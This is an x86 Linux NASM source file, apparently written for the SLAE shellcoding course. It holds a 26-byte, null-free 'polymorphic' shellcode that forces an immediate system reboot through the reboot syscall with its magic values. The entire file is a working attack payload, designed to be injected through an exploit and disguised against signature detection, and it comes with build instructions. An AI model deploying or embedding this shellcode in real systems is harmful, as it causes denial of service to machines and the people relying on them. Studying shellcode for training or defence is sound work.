; Filename: reboot_polymorphic.nasm
; Author: Upayan a.k.a. slaeryan
; SLAE: 1525
; Contact: upayansaha@icloud.com
; Purpose: This is a x86 Linux null-free polymorphic shellcode for forcing a reboot.
; Testing: ./reboot_polymorphic
; Compile with: ./compile.sh reboot_polymorphic
; Size of shellcode: 26 bytes


global _start

section .text
_start:

    xor eax, eax                ; Clearing the EAX register
    xor ebx, ebx                ; Clearing the EBX register
    xor ecx, ecx                ; Clearing the ECX register
    cdq                         ; Clearing the EDX register
    mov al, 0x58                ; Loading syscall value = 0x58 for reboot in AL
    mov ebx, 0xfee1dead         ; Loading magic 1 in EBX
    mov ecx, 672274793          ; Loading magic 2 in ECX
    mov edx, 0x1234567          ; Loading cmd val = LINUX_REBOOT_CMD_RESTART in EDX
    int 0x80                    ; Executing the reboot syscall
